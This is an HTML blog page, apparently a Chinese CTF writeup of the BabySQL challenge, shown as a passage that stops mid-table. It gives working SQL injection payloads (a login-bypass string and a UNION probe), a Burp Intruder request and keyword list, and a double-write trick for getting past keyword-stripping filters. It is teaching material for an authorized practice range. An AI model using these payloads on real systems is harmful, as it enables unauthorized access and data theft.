@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.css" integrity="sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"quellisya.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="关键字被过滤后怎么办？把 union、select、and、or、from、where、information、password 里的关键词各写两遍，服务器删掉一遍，正好剩下正确的 SQL。再用 UNION 一步步把 flag 拖出来。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[极客大挑战 2019] BabySQL：双写绕过与 UNION 注入">
+<meta property="og:url" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="关键字被过滤后怎么办？把 union、select、and、or、from、where、information、password 里的关键词各写两遍，服务器删掉一遍，正好剩下正确的 SQL。再用 UNION 一步步把 flag 拖出来。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/01-login.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/02-quote-error.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/03-universal-password.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/04-login-success.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/05-union-filtered.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/06-union-select-error.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/07-intruder.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/08-column-count-3.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/09-column-count-4.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/10-tables.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/11-columns.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/12-flag.png">
+<meta property="article:published_time" content="2026-10-30T01:20:00.000Z">
+<meta property="article:modified_time" content="2026-10-30T01:20:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content="Burp Suite">
+<meta property="article:tag" content="SQL 注入">
+<meta property="article:tag" content="UNION 注入">
+<meta property="article:tag" content="双写绕过">
+<meta property="article:tag" content="极客大挑战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/01-login.png">
+
+
+<link rel="canonical" href="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/","path":"/2026/10/30/web-ctf-sql-babysql/","title":"[极客大挑战 2019] BabySQL：双写绕过与 UNION 注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[极客大挑战 2019] BabySQL：双写绕过与 UNION 注入 | Quellisya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.umd.js" integrity="sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.1/pangu.umd.js" integrity="sha256-kRsxecBnwG6mULFPe2E6UKnNm8XfDOuDwCOprjLZuX8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","display_overflow":"scroll","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-mml-chtml.js","integrity":"sha256-ihPtDDm7pTmSF9ViEsItlvsrBTsNkz0MOXMchzOwCQw="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Quellisya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF · Web Security · Writeups</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%A7%82%E5%AF%9F%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">第一步：观察题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">第二步：找注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%85%88%E7%94%A8%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E8%BF%9B%E5%8E%BB"><span class="nav-number">3.</span> <span class="nav-text">第三步：先用万能密码进去</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%AF%95-UNION%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E5%90%83%E6%8E%89%E4%BA%86"><span class="nav-number">4.</span> <span class="nav-text">第四步：试 UNION，发现关键字被吃掉了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%94%A8-Burp-Intruder-%E6%91%B8%E6%B8%85%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-number">5.</span> <span class="nav-text">第五步：用 Burp Intruder 摸清黑名单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-number">6.</span> <span class="nav-text">第六步：双写绕过的原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%A1%AE%E5%AE%9A%E5%88%97%E6%95%B0%EF%BC%88%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%AA%E5%9D%91%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">第七步：确定列数（这里有个坑）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AB%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D"><span class="nav-number">8.</span> <span class="nav-text">第八步：爆表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B9%9D%E6%AD%A5%EF%BC%9A%E7%88%86%E5%88%97%E5%90%8D"><span class="nav-number">9.</span> <span class="nav-text">第九步：爆列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E6%AD%A5%EF%BC%9A%E6%8A%8A-flag-%E6%8B%96%E5%87%BA%E6%9D%A5"><span class="nav-number">10.</span> <span class="nav-text">第十步：把 flag 拖出来</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-payload-%E6%B1%87%E6%80%BB"><span class="nav-number">11.</span> <span class="nav-text">完整 payload 汇总</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%E5%AE%9E%E9%AA%8C%EF%BC%88PHP-MySQL%EF%BC%89"><span class="nav-number">12.</span> <span class="nav-text">本地复现实验（PHP + MySQL）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E9%80%9F%E6%9F%A5%E5%8D%A1"><span class="nav-number">13.</span> <span class="nav-text">工具速查卡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-number">14.</span> <span class="nav-text">新手常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="nav-number">15.</span> <span class="nav-text">顺手聊聊怎么防</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Quellisya</p>
+  <div class="site-description" itemprop="description">记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://quellisya.github.io/2026/10/30/web-ctf-sql-babysql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Quellisya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Quellisya's Blog">
+      <meta itemprop="description" content="记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[极客大挑战 2019] BabySQL：双写绕过与 UNION 注入 | Quellisya's Blog">
+      <meta itemprop="description" content="关键字被过滤后怎么办？把 union、select、and、or、from、where、information、password 里的关键词各写两遍，服务器删掉一遍，正好剩下正确的 SQL。再用 UNION 一步步把 flag 拖出来。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [极客大挑战 2019] BabySQL：双写绕过与 UNION 注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-10-30 09:20:00" itemprop="dateCreated datePublished" datetime="2026-10-30T09:20:00+08:00">2026-10-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/sql-injection/" itemprop="url" rel="index"><span itemprop="name">SQL 注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">关键字被过滤后怎么办？把 union、select、and、or、from、where、information、password 里的关键词各写两遍，服务器删掉一遍，正好剩下正确的 SQL。再用 UNION 一步步把 flag 拖出来。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fa fa-layer-group"></i>
+    <span class="series-nav__name">系列：SQL 注入</span>
+    <span class="series-nav__count">第 5 / 5 篇</span>
+  </div>
+  <ol class="series-nav__list"><li><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-knowledge-sql-basics&#x2F;">SQL 注入基础：原理、流程速查与防护</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-easysql-geek&#x2F;">[极客大挑战 2019] EasySQL：从一个单引号到万能密码</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-lovesql&#x2F;">[极客大挑战 2019] LoveSQL：UNION 注入的完整流程</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-easysql-suctf&#x2F;">[SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码</a></li><li class="is-current"><a href="&#x2F;2026&#x2F;10&#x2F;30&#x2F;web-ctf-sql-babysql&#x2F;">[极客大挑战 2019] BabySQL：双写绕过与 UNION 注入</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__prev" href="&#x2F;2026&#x2F;10&#x2F;22&#x2F;web-ctf-sql-easysql-suctf&#x2F;"><i class="fa fa-arrow-left"></i>[SUCTF 2019] EasySQL：黑名单、堆叠注入与反推源码</a></div>
+</nav><div class="note primary"><p><strong>一分钟速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门（建议先看 <a href="/2026/10/22/web-ctf-sql-easysql-geek/">EasySQL</a> 和 <a href="/2026/10/22/web-ctf-sql-lovesql/">LoveSQL</a>）</li>
+<li><strong>考点</strong>：关键字过滤、双写绕过、Burp Intruder 摸黑名单、UNION 注入</li>
+<li><strong>核心技巧</strong>：服务器把 <code>union</code> 删掉一次，那就写 <code>ununionion</code>；删掉中间那个，两边拼起来正好是 <code>union</code></li>
+<li><strong>flag</strong>：<code>CTF2{f3074b9f-3480-41cc-a5bc-6fd0a103befa}</code></li>
+</ul>
+</div>
+
+<div class="note info"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：<code>UNION SELECT</code> 的基本用法、<code>information_schema</code> 爆库爆表、URL 编码</li>
+<li><strong>工具</strong>：Burp Suite（Intruder 模块）。没有 Burp 也能做，文末给了 <code>curl</code> 循环和本地复现实验。</li>
+<li><strong>环境</strong>：文中的靶场地址是当时的临时环境，现在多半已失效。文末给了一个 <strong>PHP + MySQL 本地复现实验</strong>，可以完整走通双写和 UNION。</li>
+<li>本文所有测试仅用于<strong>授权靶场和本地环境</strong>，请勿对未授权的站点进行任何测试。</li>
+</ul>
+</div>
+
+<div class="note default"><p><strong>做题路线</strong></p>
+<p><code>找注入点</code> → <code>万能密码登录</code> → <code>试 UNION 被过滤</code> → <code>Intruder 摸黑名单</code> → <code>双写绕过</code> → <code>定列数</code> → <code>爆表</code> → <code>爆列</code> → <code>拖数据</code></p>
+</div>
+
+<h2 id="第一步：观察题目"><a href="#第一步：观察题目" class="headerlink" title="第一步：观察题目"></a>第一步：观察题目</h2><p>打开靶场，还是熟悉的登录框，背景上写着出题人的“狠话”：</p>
+<p><img src="/2026/10/30/web-ctf-sql-babysql/01-login.png" alt="BabySQL 登录页"></p>
+<p><em>图 1：和 EasySQL、LoveSQL 同一个系列的登录页，但这次作者说“做了严格的过滤”</em></p>
+<p>页面上的原话是：</p>
+<blockquote>
+<p>自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！</p>
+</blockquote>
+<p>这句话基本就是提示：<strong>这道题的重点在“过滤”和“绕过”</strong>，不是普通的 UNION 一把梭。</p>
+<h2 id="第二步：找注入点"><a href="#第二步：找注入点" class="headerlink" title="第二步：找注入点"></a>第二步：找注入点</h2><p>先在用户名里输入一个单引号 <code>1&#39;</code>：</p>
+<p><img src="/2026/10/30/web-ctf-sql-babysql/02-quote-error.png" alt="单引号报错"></p>
+<p><em>图 2：<code>You have an error in your SQL syntax ... near &#39;1&quot;&#39; at line 1</code></em></p>
+<p>报错说明单引号被带进了 SQL，闭合出了问题，注入点存在。报错里还透露了后端是 <strong>MariaDB</strong>，这对后面判断语法有帮助。</p>
+<div class="note warning"><p>报错只能说明“这里能注入”，不能说明是字符型还是数字型。真正的判断标准是：<strong>你构造的闭合语句能不能让页面恢复正常</strong>。下一句 <code>1&#39;||1#</code> 能登录，就说明这里是字符型，且 <code>#</code> 能注释掉后面的内容。</p>
+</div>
+
+<h2 id="第三步：先用万能密码进去"><a href="#第三步：先用万能密码进去" class="headerlink" title="第三步：先用万能密码进去"></a>第三步：先用万能密码进去</h2><p>在用户名里输入：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||1#</span><br></pre></td></tr></table></figure>
+
+<p>密码随便填，比如 <code>1</code>：</p>
+<p><img src="/2026/10/30/web-ctf-sql-babysql/03-universal-password.png" alt="万能密码"></p>
+<p><em>图 3：用户名 <code>1&#39;||1#</code>，密码 <code>1</code></em></p>
+<p>登录成功，页面回显了管理员信息：</p>
+<p><img src="/2026/10/30/web-ctf-sql-babysql/04-login-success.png" alt="登录成功"></p>
+<p><em>图 4：<code>Hello admin! Your password is &#39;57c006f528b390b78398057e3215b924&#39;</code></em></p>
+<p>这里的 <code>57c006...</code> 是 32 位 MD5，不是 flag。但页面告诉我们两件重要的事：</p>
+<ol>
+<li><code>||</code> 没有被过滤——黑名单拦的是<strong>单词</strong> <code>or</code>，不是符号 <code>||</code>；</li>
+<li>页面会回显 <strong>用户名</strong> 和 <strong>密码</strong> 两个位置，后面做 UNION 时要把数据放到对应的列。</li>
+</ol>
+<div class="note info"><p>为什么 <code>1&#39;||1#</code> 能登录？</p>
+<p>原 SQL 大概是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>代入后变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">||</span><span class="number">1</span>#<span class="string">&#x27; AND password=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&#39;1&#39;||1</code> 在 MySQL 里是逻辑或，<code>1</code> 为真，整个条件为真；<code>#</code> 把后面的密码判断注释掉了。于是不输入正确密码也能登录。</p>
+</div>
+
+<h2 id="第四步：试-UNION，发现关键字被吃掉了"><a href="#第四步：试-UNION，发现关键字被吃掉了" class="headerlink" title="第四步：试 UNION，发现关键字被吃掉了"></a>第四步：试 UNION，发现关键字被吃掉了</h2><p>用户名填 <code>admin</code>，密码填：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union select 1,2,#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/30/web-ctf-sql-babysql/05-union-filtered.png" alt="在密码框里试 UNION"></p>
+<p><em>图 5：用户名 <code>admin</code>，密码 <code>1&#39;union select 1,2,#</code></em></p>
+<p>页面报错：</p>
+<p><img src="/2026/10/30/web-ctf-sql-babysql/06-union-select-error.png" alt="UNION 被过滤后的报错"></p>
+<p><em>图 6：报错位置在 <code>&#39;1,2,#&#39;</code>，说明 <code>union</code> 和 <code>select</code> 已经不在 SQL 里了</em></p>
+<p>这个报错信息非常重要。你发出去的是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union select 1,2,#</span><br></pre></td></tr></table></figure>
+
+<p>报错却说 <code>near &#39;1,2,#&#39;</code>——中间的 <code>union select</code> 消失了。说明后端做了类似这样的处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$password</span>);</span><br></pre></td></tr></table></figure>
+
+<p>关键字被<strong>删掉</strong>，而不是被替换成空格或报错。这就是双写绕过的前提。</p>
+<h2 id="第五步：用-Burp-Intruder-摸清黑名单"><a href="#第五步：用-Burp-Intruder-摸清黑名单" class="headerlink" title="第五步：用 Burp Intruder 摸清黑名单"></a>第五步：用 Burp Intruder 摸清黑名单</h2><p>不要一个一个手试，直接用 Burp 的 Intruder 批量发包。</p>
+<p><strong>1. 把登录请求送到 Intruder</strong></p>
+<p>在 Burp 的 <code>Proxy → HTTP history</code> 里找到登录请求，右键 → <code>Send to Intruder</code>（快捷键 <code>Ctrl+I</code>）。</p>
+<p><strong>2. 设置 payload 位置</strong></p>
+<p>切到 <code>Positions</code> 标签，点 <code>Clear §</code>，然后选中密码参数的值，点 <code>Add §</code>。请求大概长这样：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/check.php?username=admin&amp;password=§1§</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;靶场地址&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 准备字典</strong></p>
+<p>在 <code>Payloads</code> 里填入这些关键字：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">union</span><br><span class="line">select</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">from</span><br><span class="line">where</span><br><span class="line">information</span><br><span class="line">UNION</span><br><span class="line">ununionion</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 开始攻击，比较响应长度</strong></p>
+<p>点 <code>Start attack</code>，按 <code>Length</code> 排序：</p>
+<p><img src="/2026/10/30/web-ctf-sql-babysql/07-intruder.png" alt="Intruder 结果"></p>
+<p><em>图 7：基线长度 804；<code>union</code>、<code>select</code>、<code>and</code>、<code>from</code>、<code>or</code>、<code>UNION</code> 都是 804；<code>ununionion</code> 是 1022</em></p>
+<p>怎么读这张表：</p>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>长度和基线（804）一样</td>
+<td>关键字被过滤，SQL 还是报错&#x2F;没结果</td>
+</tr>
+<tr>
+<td>长度明显不同（如 1022）</td>
+<td>请求产生了不同的结果，说明这个写法“活”下来了</td>
+</tr>
+<tr>
+<td><code>UNION</code> 也是 804</td>
+<td>过滤不区分大小写</td>
+</tr>
+<tr>
+<td><code>ununionion</code> 是 1022</td>
